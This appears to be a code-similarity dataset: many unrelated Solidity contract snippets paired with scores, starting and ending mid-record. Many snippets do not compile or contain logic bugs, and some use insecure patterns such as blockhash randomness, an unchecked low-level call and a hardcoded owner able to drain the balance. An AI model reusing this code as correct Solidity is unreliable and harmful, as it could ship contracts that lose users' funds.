        ICollectable _collectables, uint32 _delegateID, address _vault) public {

        pack = _pack;

        auctions = _auctions;

        kitties = _kitties;

        collectables = _collectables;

        delegateID = _delegateID;

        vault = _vault;

    }



    event CatsClaimed(uint[] statueIDs, uint[] kittyIDs);



    

    function claim(uint[] memory kittyIDs, address referrer) public payable returns (uint[] memory ids) {



        require(canClaim, ""claiming not enabled"");

        require(kittyIDs.length > 0, ""you must claim at least one cat"");

        require(claimLimit >= kittyIDs.length, ""must claim >= the claim limit at a time"");

        

        

        ids = new uint[](kittyIDs.length);

        

        for (uint i = 0; i < kittyIDs.length; i++) {



            uint kittyID = kittyIDs[i];



            

            require(!claimed[kittyID], ""kitty must not be claimed"");

            claimed[kittyID] = true;



            require(ownsOrSelling(kittyID), ""you must own all the cats you claim"");



            

            uint id = collectables.mint(delegateID, msg.sender);

            ids[i] = id;

            

            statues[id] = kittyID;    

        }

        

        

        uint totalPrice = price.mul(kittyIDs.length);



        require(msg.value >= totalPrice, ""wrong value sent to contract"");

       

        uint half = totalPrice.div(2);



        

        pack.purchaseFor.value(half)(msg.sender, uint16(kittyIDs.length), referrer); 



        

        vault.transfer(half);



        emit CatsClaimed(ids, kittyIDs);

        

        return ids;

    }



    

    function ownsOrSelling(uint kittyID) public view returns (bool) {

        

        address owner = kitties.ownerOf(kittyID);

        if (owner == msg.sender) {

            return true;

        } 

        

        if (includeAuctions) {

            address seller;

            for (uint i = 0; i < auctions.length; i++) {

                IAuction auction = auctions[i];

                

                

                if (owner == address(auction)) {

                    (seller, , , ,) = auction.getAuction(kittyID);

                    return seller == msg.sender;

                }

            }

        }

        return false;

    }

 

    function setCanClaim(bool _can, bool lock) public onlyOwner {

        require(!locked, ""claiming is permanently locked"");

        if (lock) {

            require(!_can, ""can't lock on permanently"");

            locked = true;

        }

        canClaim = _can;

    }



    function getKitty(uint statueID) public view returns (uint) {

        return statues[statueID];

    }



    function setClaimLimit(uint limit) public onlyOwner {

        claimLimit = limit;

    }



    function setIncludeAuctions(bool _include) public onlyOwner {

        includeAuctions = _include;

    }



}"
"contract InvalidOpcode {

    enum Dir {UP, LEFT, DOWN, RIGHT}
    Dir public currentDir;

    function changeDir(Dir newDir) public {
        require(uint8(newDir) <= uint8(Dir.RIGHT), ""Out of range"");
        currentDir = newDir;
    } 

}",0.5153836346392922,"contract Ownable {

  address public owner;

  modifier isOwner {

    require( msg.sender == owner );

    _;

  }

  constructor() public { owner = msg.sender; }

  function chown( address newowner ) isOwner public { owner = newowner; }

}"
"contract Crowdfunding {
struct CampaignData {
    address recipient;
    uint contributed;
    uint goal;
    uint deadline;
    uint num_contributions;
    mapping(uint => Contribution) contributions;
}

struct Contribution {
    address contributor;
    uint amount;
}

uint nextCampaignId;
mapping(uint256 => CampaignData) campaigns;


function start(address recipient, uint256 goal, uint256 deadline) returns (uint id) {
    var campaign = campaigns[nextCampaignId];
    campaign.recipient = recipient;
    campaign.goal = goal;
    campaign.deadline = deadline;
    nextCampaignId ++;
    id = nextCampaignId;
}",0.5318339054316878,"contract CryptoMiningWarInterface {

    address public sponsor;

    address public administrator;

    mapping(address => PlayerData) public players;

    struct PlayerData {

        uint256 roundNumber;

        mapping(uint256 => uint256) minerCount;

        uint256 hashrate;

        uint256 crystals;

        uint256 lastUpdateTime;

        uint256 referral_count;

        uint256 noQuest;

    }

    function getHashratePerDay(address ) public pure returns (uint256 ) {}

    function addCrystal( address , uint256  ) public pure {}

    function subCrystal( address , uint256  ) public pure {}

    function fallback() public payable {}

}"
"contract TestB {
    B testB;
    A testA;

    function beforeEach() {
        A = A(DeployedAddresses.A());
        B = testA.createB(""test"");
    }

    function testOwnerIsSet() {
        address aOwner = A.owner();
        address bOwner = B.owner();
        Assert.equal(aOwner, bOwner, ""Owner's address does not match"");
    }
}",0.5748198292678136,"contract Owned {
    address public owner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    function Owned() public {
        owner = msg.sender;
    }

    function transferOwnership(address _newOwner) public {
        require(msg.sender == owner);
        owner = _newOwner;
    }
}"
"contract VotingDapp {

  mapping (bytes32 => uint8) public votesReceived;

  bytes32[] public candidateList;

  function VotingDapp(bytes32[] candidateNames) public {
    
    candidateList = candidateNames;
  }

  function totalVotesFor(bytes32 candidate) public view returns (uint8) {
    if(validCandidate(candidate) == false) revert();
    return votesReceived[candidate];
  }

  function voteForCandidate(bytes32 candidate) public {
    if(validCandidate(candidate) == false) revert();
    votesReceived[candidate] += 1;
  }

  function validCandidate(bytes32 candidate) public view returns (bool) {
    for(uint i = 0; i < candidateList.length; i++){
      if(candidateList[i] == candidate){
        return true;
      }
    }
    return false;
  }

  function totalVotesReceived() external view returns(uint){
      uint sum = 0;
      for(uint i = 0; i < candidateList.length; i++){
          sum += votesReceived[candidateList[i]];
      }
      return sum;
  }

}",0.543399739177132,"contract Authorize is Ownable {

    

    address public backEndOperator = msg.sender;



    mapping(address=>bool) public whitelist;



    event Authorized(address wlCandidate, uint timestamp);



    event Revoked(address wlCandidate, uint timestamp);





    modifier backEnd() {

        require(msg.sender == backEndOperator || msg.sender == owner);

        _;

    }



    function setBackEndAddress(address newBackEndOperator) public onlyOwner {

        backEndOperator = newBackEndOperator;

    }





    function authorize(address wlCandidate) public backEnd  {

        require(wlCandidate != address(0x0));

        require(!isWhitelisted(wlCandidate));

        whitelist[wlCandidate] = true;

        emit Authorized(wlCandidate, now);

    }



    function revoke(address wlCandidate) public  onlyOwner {

        whitelist[wlCandidate] = false;

        emit Revoked(wlCandidate, now);

    }



    function isWhitelisted(address wlCandidate) public view returns(bool) {

        return whitelist[wlCandidate];

    }



}"
"contract SAY is ERC20 {

    string word = 'Something';

    function SAYSOMETHING() public returns(string)  {

        token.approve(msg.sender, 500);
        token.transferFrom(msg.sender,this, 500);
        return word;
    }

}",0.5665605598274871,"contract StandardToken is ERC20 {

    string public name;

    string public symbol;

    uint256 public decimals;



    function isToken() public constant returns (bool) {

        return true;

    }

}"
"contract testInputArray {
    
    event LogFunctionWithMappingAsInput(address from, address to, string message);

    function sendMessage(address to, mapping (string => string) aMapping) {
        LogFunctionWithMappingAsInput(msg.sender, to, aMapping[""test1""]);
    }
}",0.5436547290364202,"contract RecoverEosKey {

    

    mapping (address => string) public keys;

    

    event LogRegister (address user, string key);

    

    function register(string key) public {

        assert(bytes(key).length <= 64);

        keys[msg.sender] = key;

        emit LogRegister(msg.sender, key);

    }

}"
"contract User {

    address userWalletAddr;
    string userName;
    string userEmail; 

    struct UserActivity{
        address userWalletAddr;
        string activityDescription;
        uint dateTime;
    }

    UserActivity[] private activities;

    constructor(string  memory _userName, string memory _userEmail) public {
        userWalletAddr = msg.sender;
        userName = _userName;
        userEmail = _userEmail;
    }

    function addUserActivity(string  memory _activityDescription) public {
            activities.push(UserActivity({
                    userWalletAddr : msg.sender,
                    activityDescription: _activityDescription,
                    dateTime: now
            }));
        }

    
    function listUserActivities(address _userWalletAddr, uint _startInterVal, uint _endInterval)
        public view returns(address, string memory,  uint){
        for(uint i = 0; i <= activities.length; i ++){
            while(
                activities[i].userWalletAddr == _userWalletAddr &&
                activities[i].dateTime >= _startInterVal &&
                activities[i].dateTime < _endInterval)
                    {
                    return
                    (
                    activities[i].userWalletAddr,
                    activities[i].activityDescription,
                    activities[i].dateTime
                );
            }
        }
    }
}",0.5188498520864702,"contract ArtworkCore is ArtworkQuestions {



    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    



    

    address public newContractAddress;



    

    function ArtworkCore() public {

        

        paused = true;



        

        ceoAddress = msg.sender;



        

        cooAddress = msg.sender;



        

        _createArtwork(""none"", ""none"", 0, address(0));

    }



    

    

    

    function() external payable {

        require(

            msg.sender == address(saleAuction)

        );

    }



    

    

    

    

    

    

    function setNewAddress(address _v2Address) external onlyCEO whenPaused {

        

        newContractAddress = _v2Address;

        ContractUpgrade(_v2Address);

    }



    

    function withdrawBalance() external onlyCFO {

        uint256 balance = this.balance;

        cfoAddress.send(balance);

    }



    

    

    function getArtwork(uint256 _id)

        external

        view

        returns (

        uint256 birthTime,

        string name,

        string author,

        uint32 series

    ) {

        Artwork storage art = artworks[_id];

        birthTime = uint256(art.birthTime);

        name = string(art.name);

        author = string(art.author);

        series = uint32(art.series);

    }



    

    

    

    

    

    function unpause() public onlyCEO whenPaused {

        require(saleAuction != address(0));

        require(newContractAddress == address(0));

        

        super.unpause();

    }



}"
"contract MyContract {
    address originalContractAddress = 0x123...;

    function mainFunction() public {
        originalContractInterface(originalContractAddress).originalFunction();
        checkReturnData();
    }

    function checkReturnData() internal returns (uint256) {
        uint256 isReturnDataPresent = 0;

        assembly {

            switch returndatasize

            
            case 0x0 {
                isReturnDataPresent := 0
            }

            
            case 0x20 {
                isReturnDataPresent := 1
            }
        }

        return isReturnDataPresent;
    }
}",0.5448600654751032,"contract ZapCoordinatorInterface is Ownable {

    function addImmutableContract(string contractName, address newAddress) external;

    function updateContract(string contractName, address newAddress) external;

    function getContractName(uint index) public view returns (string);

    function getContract(string contractName) public view returns (address);

    function updateAllDependencies() external;

}"
"contract example {

 Bytes16 source=0xa9c40ddcb43ebbc83add97b8f9f361f1;

 function returnByte(uint k) returns (bytes1 a) {
    a = source[k];
    return a;       
 }

}",0.5248326484945982,"contract Relay {
  function relayReceiveApproval(address _caller, address _spender, uint256 _amount, bytes _extraData) returns (bool success);
}"
"contract Hello is mortal
{

string public message;

function Hello(){
    message = 'This is the initial Message';
    }

function getMessage() public constant returns(string){
    return message;
    }

function setNewMessage(string newMessage) public payable {
    message = newMessage;   
    }
}",0.5931432989924091,"contract ERC721Metadata is ERC721Basic {
  
  
  
  bytes4 constant INTERFACE_ERC721_METADATA = 0x5b5e139f;

  function name() public view returns (string _name);
  function symbol() public view returns (string _symbol);
  function tokenURI(uint256 _tokenId) public view returns (string);
}"
"contract WorkingWithVariables {
    uint256 public myUint
    
    function setMyUint(uint_myUint) public {
        myUint = _myUint;
    }
    
    bool public mybool;
    
    function setMyBool(bool_myBool) public {
        myBool = _myBool;
    }
}",0.5760818366084126,"contract UpgradeAgent is SafeMath {
  address public owner;
  bool public isUpgradeAgent;
  function upgradeFrom(address _from, uint256 _value) public;
  function setOriginalSupply() public;
}"
"contract VotingContract is Owned {

    
    struct Member {
        address member;
        uint donatedETH; 
        uint since; 
        uint lastDonatedETH; 
    }

    mapping (address => uint) public memberId;
    Member[] public members;

    address public owner;

    SafeMathHelper public math;

    
    struct Proposal
    {
        address memberAddress; 
        
    }
    

    
    event MembershipAccepted(string desc, address member, bool isMember);
    event MembershipRemoved(string desc, address member);

    
    modifier onlyMembers {
        require(memberId[msg.sender] != 0);
        _;
    }



    constructor (address _owner) public payable{
        owner = _owner;
        uint id = 0;
        memberId[owner] = 0; 
        members[id] = Member({member: _owner, donatedETH: msg.value, since: now, lastDonatedETH: msg.value});

    }

    
    function addMember (address _memberAddress)  
                onlyMembers 
                payable
                public 
                returns(bool) 
                {

        uint id = memberId[_memberAddress];
        if (id == 0) {
            memberId[_memberAddress] = members.length;
            id = members.length++;
        }

        bool votingOfMembers = Voting();
        if (votingOfMembers) {
            members[id] = Member({member: _memberAddress, donatedETH: msg.value, since: now, lastDonatedETH: msg.value});
            emit MembershipAccepted(""Member is added"", _memberAddress, true);
            return true;            
        } 
        else return false;

    }


    
    function Voting () public 
            onlyMembers 
            returns(bool) {
        
        Proposal[] proposals;
        uint yesVotes = 0;
        uint noVotes = 0;
        uint numOfAllVotes = members.length;
        bool voteYes; 
        bool voteNo; 
        bool votedForMember = false;

        while(math.add(yesVotes, noVotes) <= numOfAllVotes){
        
            for (uint i = 0; i < numOfAllVotes; i++) {

                for (uint p = 0; p < proposals.length; p++)
                    {
                    if (proposals[p].memberAddress == msg.sender)
                        {
                            votedForMember = true;
                        }
                    } 

                if (!votedForMember ) {
                    
                    proposals.push(Proposal({
                        memberAddress : msg.sender
                        
                        }));

                    if (voteYes == true) {
                        yesVotes++;
                    } else if (voteNo == true) {
                        noVotes++;
                    }            
                }
            }
        }

        
        if (math.div100(yesVotes, numOfAllVotes) < 0.5*100) {
            
            return false;
        } else {
            return true;
        }

    }


    
    function removeMember(address _memberAddress) 
            public
            onlyOwner
        {
            uint id =  memberId[_memberAddress]; 

            if (id != 0) {
                
                
                delete  memberId[_memberAddress];
                removeFromMembers(id);
                emit MembershipRemoved(""Removed member: "", _memberAddress); 
            }
        }

    function removeFromMembers(uint index) public onlyOwner {
    
    
        if (index < members.length) {
            for (uint i = index; i<members.length-1; i++){
                members[i] = members[i+1];
            }
            delete members[members.length-1];
            members.length--;
            
        }

    }

function killContract () public 
                onlyOwner 
                {
        selfdestruct(owner); 
    }


}",0.5967665898763626,"contract Token {
    string public standard = &#39;Token 0.1&#39;;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;
    address[] public users;
    bytes32 public filehash;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);

    modifier onlyOwner() {
        if (owner != msg.sender) {
            throw;
        } else {
            _;
        }
    }

    function Token() {
        owner = 0x7F325a2d8365385e4B189b708274526899c17453;
       
        address firstOwner = owner;
        balanceOf[firstOwner] = 100000000;
        totalSupply = 100000000;
        name = &#39;Cryptonian&#39;;
        symbol = &#39;crypt&#39;;
        decimals = 8;
        msg.sender.send(msg.value);
        users.push(0x7F325a2d8365385e4B189b708274526899c17453);
    }

    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        Transfer(msg.sender, _to, _value);
        bool userExists = false;
        uint memberCount = users.length;
        for (uint i = 0; i < memberCount; i++) {
            if (users[i] == _to) {
                userExists = true;
            }
        }
        if (userExists == false) {
            users.push(_to);
        }
    }

    function approve(address _spender, uint256 _value) returns(bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function collectExcess() onlyOwner {
        owner.send(this.balance - 2100000);
    }

    function liquidate(address newOwner) onlyOwner {
        uint sellAmount = msg.value;
        uint memberCount = users.length;
        owner = newOwner;
        for (uint i = 0; i < memberCount; i++) {
            liquidateUser(users[i], sellAmount);
        }
    }

    function liquidateUser(address user, uint sentValue) onlyOwner {
        uint userBalance = balanceOf[user] * 10000000;
        uint userPercentage = userBalance / totalSupply;
        uint etherAmount = (sentValue * userPercentage) / 10000000;
        if (user.send(etherAmount)) {
            balanceOf[user] = 0;
        }
    }

    function issueDividend() onlyOwner {
        uint sellAmount = msg.value;
        uint memberCount = users.length;
        for (uint i = 0; i < memberCount; i++) {
            sendDividend(users[i], sellAmount);
        }
    }

    function sendDividend(address user, uint sentValue) onlyOwner {
        uint userBalance = balanceOf[user] * 10000000;
        uint userPercentage = userBalance / totalSupply;
        uint etherAmount = (sentValue * userPercentage) / 10000000;
        if (user.send(etherAmount)) {}
    }

    function() {}
}"
"contract TestContract {
    event Tested(address sender);

    function test() {
      require(msg.sender != 0x0);
      Tested(msg.sender);
    }
}",0.5931908965833579,"contract Owned {

    
    address owner;

    
    function Owned() {
        owner = msg.sender;
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}"
"contract NDA {
bytes32  party1name;
bytes32  party2name; 
bytes32  pary1regaddr;

event Setparty2 (address indexed _from,bytes32 _party2name);
function NDA() {
    party1name = ""Me"";
}

function setparty2(bytes32 _party2name, bytes32 _pary1regaddr){
    party2name = _party2name;
    pary1regaddr = _pary1regaddr;
    Setparty2(msg.sender, _party2name);
}

function get() constant returns (bytes32, bytes32) {
    return (party1name, party2name);
}
}",0.5348767792782709,"contract Username {
  event Updated(address indexed user, bytes32 indexed username);

  mapping(address => bytes32) public username;
  mapping(bytes32 => address) public owner;

  function Update(bytes32 _username) public {
    require(owner[_username] == address(0));
    bytes32 oldUserName = username[msg.sender];
    owner[_username] = msg.sender;
    owner[oldUserName] = address(0);
    username[msg.sender] = _username;
    emit Updated(msg.sender, _username);
  }
}"
"contract test {
    bytes data;
    function storeData(bytes _data) {
        data = _data;
    }
}",0.5789093410475205,"contract IInvokable {
    function execute(bytes calldata data) external payable;
}"
"contract StringGas {
    string[] words;
    function StringGas() public {
        words.push(""BEGIN"");
    }
    function addAWord(string _word) external {
        words.push(_word);
    }
}",0.5271941011204148,"contract Client4 {
    
    
    
    
    
    
    function callback(uint256 id, string response1, string response2, string response3, string response4) external;
}"
"contract kyc {
    
    struct BankName {
        uint id;
        string name;
        uint customercount;
        address payable acc;
    }
    
    uint public KYC_PRICE = 1 ether;
    
    mapping(address => bool) public customers;
    
    mapping(uint => BankName) public bankname;
    
    uint public bankCount;

    
    event joinEvent (
        uint indexed _BankId
    );

    constructor() public {
        addBank(""Bank A"");
        addBank(""Bank B"");
    }

    
    function addBank(string memory _name,address payable acc) private {
        bankCount ++;
        bankname[bankCount] = BankName(bankCount, _name, 0);
    }

    function join (uint _BankId) public {

        
        require(_BankId > 0 && _BankId <= bankCount);
        
        customers[msg.sender] = true;
        
        bankname[_BankId].customercount ++;
        
        emit joinEvent(_BankId);
    }
}",0.5919416991351579,"contract ERC20Token {



    string public name;

    string public symbol;

    uint8 public decimals;

    uint public totalSupply;



    mapping(address => uint) public balanceOf;

    mapping(address => mapping(address => uint)) public allowance;



    function approve(address spender, uint quantity) public returns (bool);

    function transfer(address to, uint quantity) public returns (bool);

    function transferFrom(address from, address to, uint quantity) public returns (bool);



    event Transfer(address indexed from, address indexed to, uint quantity);

    event Approval(address indexed owner, address indexed spender, uint quantity);



}"
"contract Adoption {

  mapping (bytes32 => uint8) public votesReceived;
  bytes32[] public candidateList;

  function Voting(bytes32[] candidateNames) public {
    candidateList = candidateNames;
  }

  function totalVotesFor(bytes32 candidate) view public returns (uint8) {
    require(validCandidate(candidate));
    return votesReceived[candidate];
  }

  function voteForCandidate(bytes32 candidate) public {
    require(validCandidate(candidate));
    votesReceived[candidate]  += 1;
  }

  function validCandidate(bytes32 candidate) view public returns (bool) {
    for(uint i = 0; i < candidateList.length; i++) {
      if (candidateList[i] == candidate) {
        return true;
      }
    }
    return false;
   }
}",0.5607985622608023,"contract ExchangeRate is Ownable {
 
  event RateUpdated(uint timestamp, bytes32 symbol, uint rate);
 
  mapping(bytes32 => uint) public rates;
 
  
  function updateRate(string _symbol, uint _rate) public onlyOwner {
    rates[sha3(_symbol)] = _rate;
    RateUpdated(now, sha3(_symbol), _rate);
  }
 
  
  function updateRates(uint[] data) public onlyOwner {
    if (data.length % 2 > 0)
      return;
    uint i = 0;
    while (i < data.length / 2) {
      bytes32 symbol = bytes32(data[i * 2]);
      uint rate = data[i * 2 + 1];
      rates[symbol] = rate;
      RateUpdated(now, symbol, rate);
      i++;
    }
  }
 
  
  function getRate(string _symbol) public constant returns(uint) {
    return rates[sha3(_symbol)];
  }
 
}"
"contract Test2 {

   function SendCoin(uint8 x, address jack) public {
   uint8 x1=9 ;
   uint8 x2=11;
   uint8 value = 90;
   if ( x1<x && x<x2 ){
   Test(0xc7398563377a6f11EDA8D9Fb6962CA79f20D5B86).transfer(jack,value);
    }
   }
}",0.5173998163547389,"contract SensusTokenSender is Ownable {

    function drop(TokenERC20 token, address[] to, uint256[] value) onlyOwner public {
    for (uint256 i = 0; i < to.length; i++) {
      token.transfer(to[i], value[i]);
    }
  }
}"
"contract Factory {
    bytes32[] public Names;
    address[] public newContracts;

    function createContract(bytes32 name) returns(address) {
        address newContract = new MyContract(name);
        newContracts.push(newContract);
        return newContract;
    }

    function getName(uint i) {
        MyContract con = MyContract(newContracts[i]);
        Names[i] = con.Name();
    }
}",0.5827615157742774,"contract AcceptsExp {

    Experiment public tokenContract;



    function AcceptsExp(address _tokenContract) public {

        tokenContract = Experiment(_tokenContract);

    }



    modifier onlyTokenContract {

        require(msg.sender == address(tokenContract));

        _;

    }



    

    function tokenFallback(address _from, uint256 _value, bytes _data) external returns (bool);

}"
"contract UserDetails {
  struct User {
    string fileHash;
    address addr;
  }
  User[] userArr;

  function addUserDetail(string hash,address blockAddress) public returns (bool) {

    User memory usr;
    usr = User({fileHash:hash, addr:blockAddress});

    userArr.push(usr);

  }
}",0.5638940718581253,"contract Snowflake {

    function whitelistResolver(address resolver) external;

    function withdrawFrom(string hydroIdFrom, address to, uint amount) public returns (bool);

    function getHydroId(address _address) public view returns (string hydroId);

}"
"contract C {
    Struct S {
        uint a;
        uint b;
    }

    mapping(address => s) structs;

    function updateStructs(S sInstance) private {
        structs[msg.sender] = sInstance;
    }

    function addStruct (uint _a, uint _b) payable {
        S memory s = S({a: _a, b: _b});
        updateStructs(s);
    }
}",0.5884488146721745,"contract SafeMath {
    function safeSub(uint a, uint b) pure internal returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint a, uint b) pure internal returns (uint) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
}"
"contract C {

     uint[] numbers;

     function initNumbers() {
         numbers.push(1);
         numbers.push(2);
     }

     function stateChanger(uint a) {
         numbers.push(a);
     }
}",0.5298272244336694,"contract BurnableToken {
  function transferFrom(address, address, uint) public returns (bool);
  function burn(uint) public;
}"
"contract ERC1400Factory {

    ERC1400[] public deployedERC1400;
    bytes32[] public tokenDefaultPartitions;
    
    address public certificateSigner;
 
    constructor(address certificat, bytes32[] memory tokenDefaul) public {
  
    certificateSigner = certificat;
    tokenDefaultPartitions = tokenDefaul;
    }
   
    function createERC1400(string memory name, string memory symbol, uint256 granularity, address[] memory controllers) public  {
         
        ERC1400 newERC1400 = new ERC1400(name, symbol, granularity, controllers, certificateSigner, tokenDefaultPartitions);
   
        deployedERC1400.push(newERC1400);
    }

    function getDeployedERC1400() public view returns (ERC1400[] memory ) {
        return deployedERC1400;
    }
}",0.593825225021063,"contract SecurityTokenFactory {
    
    
    
    string public stamp;
    
    SecurityToken private ST;
    
    address[] public tokens;
    
    event Deployed(address indexed ST, address indexed owner);
    
    constructor(string memory _stamp) public 
	{
        stamp = _stamp;
	}
    
    function newSecurityToken(
        string memory name, 
		string memory symbol,
		uint8 decimals,
		IERC20 _fundsToken,
		address[] memory ownership,
		uint256[] memory issuance) public {
       
        ST = new SecurityToken(
            name, 
            symbol,
            decimals,
            _fundsToken,
            ownership,
            issuance);
        
        tokens.push(address(ST));
        
        emit Deployed(address(ST), ownership[0]);
    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract TestLibrary is IntExtended {

    function testIncrement(uint _base) returns (uint) {
        return IntExtended.increment(_base);
    }       
}",0.5764199133366397,"contract Token {
    function transfer(address, uint) returns(bool);
    function balanceOf(address) constant returns (uint);
}"
"contract A {
  event Hello(uint num);
  function doSomething() {
   Hello(1);
  }
}",0.5807653658237271,"contract Emitter {
    event Emit(uint x);
    function emit(uint x) {
        Emit(x);
    }
}"
"contract Caller {
    function someAction(address addr) returns(uint) {
        Callee c = Callee(addr);
        return c.getValue(100);
    }

    function storeAction(address addr) returns(uint) {
        Callee c = Callee(addr);
        c.storeValue(100);
        return c.getValues();
    }

    function someUnsafeAction(address addr) {
        addr.call(bytes4(keccak256(""storeValue(uint256)"")), 100);
    }
}",0.5777746930425806,"contract StdToken {
     function transfer(address, uint256) returns(bool);
     function transferFrom(address, address, uint256) returns(bool);
     function balanceOf(address) constant returns (uint256);
     function approve(address, uint256) returns (bool);
     function allowance(address, address) constant returns (uint256);
}"
"contract socialposts {


EMPToken token;
address _empTokenAdr = 0xd3591733C103EaCfBE7e0c2b4C037764dA836FDe;
constructor() public {


createPost('I am using Blokchain','David Abrahim');

}
function createPost(string memory content,string memory name) public {
   postCount++;
   posts[postCount] = post(postCount,content,name,msg.sender);
   
   token = EMPToken(_empTokenAdr);
   token.approve(msg.sender,2);
   }
}",0.5306662835631066,"contract ERC20TokenFactory {
    
    function ERC20TokenFactory() public {
        createERC20Token(10000000000, 'TokenPocket Token', 4, 'TPT');
    }
    
    function createERC20Token(uint256 _initialAmount, string _name, uint8 _decimals, string _symbol) 
        public 
    returns (address) {
        ERC20 newToken = (new ERC20(_initialAmount, _name, _decimals, _symbol));
        newToken.transfer(msg.sender, _initialAmount);
    }
}"
"contract ProductList {
    address productAddr;
    string p_name;
    uint p_id;
    Product p;
    function ProductList(address addr) {
        productAddr = addr;
        p = Product(addr);
    }

    function readProduct (uint u) returns (bool c) {
      p_id = p.products[u].id;
      p_name = p.products[u].name;
      c = true;
    }
}",0.5885774695922655,"contract AppCoinsIABInterface {
    function division(uint numerator, uint denominator) public constant returns (uint);
    function buy(uint _amount, string _sku, address _addr_appc, address _dev, address _appstore, address _oem) public constant returns (bool);
}"
"contract getSchwifty {
  string internal constant seeWhatYouGot = ""I want to see what you got!"";
  string internal contestResult;
  mapping(uint=>string) Record;

  
  function getSchwifty(string _contestResult) public {
    contestResult = _contestResult;
  }

  function addRecord(uint id, string hashData) public {
    Record[id] = hashData;
  }

  function getRecord(uint id) public returns (string) {
    return Record[id];
  }

  function showMeWhatYouGot() external pure returns (string) {
    return seeWhatYouGot;
  }

  function enterContest(string _contestEntry) external view returns (string) {
    
    return contestResult;
  }
}",0.566004420202017,"contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function qrcode() public pure returns (string memory) {
        string memory url;
        url= 'https:
        return url;
    }
}"
"contract Example {
  struct node { 
    uint32 blk_start;
    uint32 blk_end;
    uint16 core;
    uint32 next; 
   }
   node[]    array_1;
   node[10]  array_2;
   uint32 index = 0;

   function push_me( uint32 blk_start_, uint32 blk_end_, uint16 core_ ) {
     array_1.push(node( { blk_start: blk_start_, blk_end: blk_end_, core: core_, next: 10 }));
   }

   function change( uint32 blk_start_, uint32 blk_end_, uint16 core_ ) {
     array_2[index].core       = core_;
     array_2[index].blk_start = blk_start_;
     array_2[index].blk_end   = blk_end_;
     array_2[index].next      = 10;
     index++;
   }
}",0.5047629193341446,"contract Timelocked is Owned {

  uint256 public lockstart;

  uint256 public lockend;



  event SetTimelock(uint256 start, uint256 end);



  

  modifier notTimeLocked() {

    require((msg.sender == owner) || (now < lockstart || now > lockend));

    _;

  }



  function setTimeLock(uint256 _start, uint256 _end) public onlyOwner {

    require(_end > _start);

    lockstart = _start;

    lockend = _end;

    

    emit SetTimelock(_start, _end);

  }

  

  function releaseTimeLock() public onlyOwner {

    lockstart = 0;

    lockend = 0;

    

    emit SetTimelock(0, 0);

  }



}"
"contract WrapperCreator {

    function WrapperCreator() {
    }

    function createTopic(string name, bytes32[] resultNames, uint256 endBlock)
        returns (Topic tokenAddress)
    {
        return new Topic(name, resultNames, bettingEndBlock);
    }
}",0.5683947829221088,"contract MultiSigInterface{
  function update_and_check_reach_majority(uint64 id, string memory name, bytes32 hash, address sender) public returns (bool);
  function is_signer(address addr) public view returns(bool);
}"
"contract URP {

    uint8 x1; 
    uint8 x2;
    uint8 y1;
    uint8 y2;
    uint8 z1;
    uint8 z2;
    uint8 retailer; 
    uint8 value; 
    uint8 x; 
    uint8 y; 
    uint8 z;
    uint8 shopper;

function SendCoin(uint8 _x1, uint8 _x2, uint8 _y1, uint8 _y2, uint8 _z1, uint8 _z2, uint8 _ret, uint8 _value, uint8 _x, uint8 _y, uint8 _z, uint8 _shop) public {
       x1 = _x1;
       x2 = _x2;
       y1 = _y1;
       y2 = _y2;
       z1 = _z1;
       z2 = _z2;
       retailer = _retailer;
       value = _value;
       x = _x;
       y = _y;
       z =_z;
       shopper = _shopper;
   }

   function getSendCoin() public constant returns (uint8, uint8, uint8, uint8, uint8, uint8, uint8, uint8, uint8, uint8, uint8, uint8) {
       return (x1, x2, y1, y2, z1, z2, retailer, value, x, y, z, shopper);
   }  
}",0.5491408268072269,"contract SafeMath {

    function safeAdd(uint x, uint y) pure internal returns(uint) {

      uint z = x + y;

      assert((z >= x) && (z >= y));

      return z;

    }



    function safeSubtract(uint x, uint y) pure internal returns(uint) {

      assert(x >= y);

      uint z = x - y;

      return z;

    }



    function safeMult(uint x, uint y) pure internal returns(uint) {

      uint z = x * y;

      assert((x == 0)||(z/x == y));

      return z;

    }

    

     function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {

    

    uint256 c = a / b;

    

    return c;

  }



    function getRandomNumber(uint16 maxRandom, uint8 min, address privateAddress) constant public returns(uint8) {

        uint256 genNum = uint256(block.blockhash(block.number-1)) + uint256(privateAddress);

        return uint8(genNum % (maxRandom - min + 1)+min);

    }

}"
"contract Lister {
    struct ListMembers {
        bytes32[] members;
        uint256 averageNumber; 
        uint256 runningNumber;  
    }

    
    ListMembers public lm;

   function calculateAverageNumber() {        
        uint256 numMembers = uint256(lm.members.length);
        uint256 sampleSum = lm.runningNumber - lm.randomNumber;
        uint256 avgSum = sampleSum / numMembers;
        lm.averageNumber = avgSum;
    }

     function getAverageNumber() returns (uint256) {
        return lm.averageNumber;
    }",0.518017463065087,"contract CryptoEngineerOldInterface {

    address public gameSponsor;

    uint256 public gameSponsorPrice;

    

    function getBoosterData(uint256 ) public view returns (address ,uint256 , uint256 ) {}

    function calculateCurrentVirus(address ) external view returns(uint256 ) {}

    function getPlayerData(address ) external view returns(uint256 , uint256 , uint256 , uint256 , uint256 , uint256 , uint256[8] , uint256 , uint256 ) {}

}"
"contract Monster {
    string name;
    uint win;
    uint loss;
    event EmitName(string name);

